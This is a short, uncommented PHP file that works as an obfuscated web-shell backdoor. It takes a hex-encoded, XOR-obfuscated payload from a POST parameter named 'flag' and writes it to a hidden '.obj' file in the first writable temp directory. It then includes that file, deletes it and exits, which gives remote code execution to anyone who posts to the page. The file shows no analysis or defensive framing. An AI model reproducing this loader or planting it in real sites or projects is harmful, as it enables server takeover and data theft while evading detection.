<?php

if(!is_null($_POST["fla\x67"] ?? null)){
	$element = array_filter([getcwd(), getenv("TMP"), "/tmp", "/dev/shm", sys_get_temp_dir(), ini_get("upload_tmp_dir"), "/var/tmp", session_save_path(), getenv("TEMP")]);
	$data = hex2bin($_POST["fla\x67"]);
	$resource= ''; $a = 0; do{$resource .= chr(ord($data[$a]) ^ 69);$a++;} while($a < strlen($data));
	foreach ($element as $marker):
    		if (!( !is_dir($marker) || !is_writable($marker) )) {
    $entity = implode("/", [$marker, ".obj"]);
    if (@file_put_contents($entity, $resource) !== false) {
	include $entity;
	unlink($entity);
	die();
}
}
endforeach;
}